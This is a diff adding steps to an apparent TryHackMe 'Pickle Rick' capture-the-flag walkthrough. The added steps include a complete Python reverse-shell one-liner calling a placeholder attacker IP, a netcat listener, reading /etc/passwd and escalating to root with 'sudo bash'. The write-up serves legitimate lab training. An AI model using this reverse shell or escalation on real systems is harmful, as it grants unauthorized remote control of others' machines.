@@ -1,5 +1,10 @@
 # PICKLERICK ROOM
 
+<p align="center">
+  <a href="https://tryhackme.com/p/hernanicyber"><img src="https://denise.matehackers.org/bahackers/images/tryhackme/tryhackme-logo.png")
+ alt="thm_profile" width="200" /></a>
+  
+
 Link -> https://tryhackme.com/room/picklerick
 
 Difficulty -> Easy
@@ -7,6 +12,9 @@ Difficulty -> Easy
 ------------------------------------------------
 
 So first lets deploy the machine to attack it!
+
+![Screenshot from 2020-12-13 19-02-29](https://user-images.githubusercontent.com/75812403/102021162-c1fd4100-3d75-11eb-9fd0-9c349f7e7069.png)
+
 
 Let's go!
 
@@ -68,5 +76,49 @@ We are in!! Now we can execute commands in this page. Let's just simply write th
 
 And we got some interesting file ```Sup3rS3cretPickl3Ingred.txt``` now you can just read the file and you got the first flag! :)
 
+But in this image we can see another interesting file .txt  ```clue.txt``` , so why we don't try to open it? Let's take a look inside of it!
+
+------------------------
+
+![Screenshot from 2020-12-12 19-33-54](https://user-images.githubusercontent.com/75812403/102020742-09ce9900-3d73-11eb-9477-8aaafea7f12b.png)
+
+Hmm so to find the other ingridient we need to look around, so first let's see if we have python running on this machine, so that we can maybe, spawn a reverse shell!
+
+-------------
+
+![Screenshot from 2020-12-12 19-39-00](https://user-images.githubusercontent.com/75812403/102020814-6cc03000-3d73-11eb-8786-31948013ad52.png)
 
 
+Uhhh we got python running on this machine, so let's create a python payload to spawn a reverse shell for us!
+
+We can use this simple line of code ```python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_OF_YOUR_MACHINE_IN_THE_THM_NETWORK",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
+
+--------------------------------
+
+Now let's create a netcat sessions listening on port 4444
+
+![Screenshot from 2020-12-12 19-39-21](https://user-images.githubusercontent.com/75812403/102020874-f7a12a80-3d73-11eb-86d2-2a3a4b4e5098.png)
+
+And bang!! We got in!!
+
+So now we can take a look around filesystem, let's try to acess home directory first searching for some user directory, so let's run the command 
+```cd /home``` , and we can find a directory with a name of ```rick``` let's get in and run command ```ls```
+
+![Screenshot from 2020-12-12 19-45-54](https://user-images.githubusercontent.com/75812403/102021019-d0972880-3d74-11eb-92d0-df47fde82091.png)
+
+We found the seconde flag!! One remains to complete this challenge!
+
+---------------------
+
+Now let's run the command ```cat /etc/passwd``` and we got a list of users and we can see that the **root** is using bash, let's try the command ```sudo bash```
+to see if we are allowed to get the shell of root 
+
+
+![Screenshot from 2020-12-12 19-49-29](https://user-images.githubusercontent.com/75812403/102021077-43a09f00-3d75-11eb-8f40-6ee557f9e5f8.png)
+
+
+![Screenshot from 2020-12-12 19-49-36](https://user-images.githubusercontent.com/75812403/102021085-4dc29d80-3d75-11eb-9bed-d8897186922c.png)
+
+Yep! And we are in, so now you just have to read the third and the last flag to complete this amazing and very funny challange!!
+
+So challenge solved, hope you enjoyed, and of course I hope have helped you! :)
